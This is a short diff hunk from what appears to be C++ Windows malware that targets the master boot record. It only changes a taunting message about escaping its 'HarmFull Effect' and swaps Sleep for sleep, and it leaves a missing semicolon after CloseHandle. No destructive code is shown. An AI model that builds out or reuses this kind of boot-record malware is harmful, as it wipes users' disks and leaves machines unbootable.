@@ -23,8 +23,8 @@ int main(){
         ExitProcess(0);
     }//or else it will do this
     else{
-        cout << "Ahh You Escaped From My Effect";
-        Sleep(5000);
+        cout << "Ahh You Escaped From My HarmFull Effect";
+        sleep(5000);
         ExitProcess(0);
     }
     CloseHandle(MasterBootRecord) //close handler
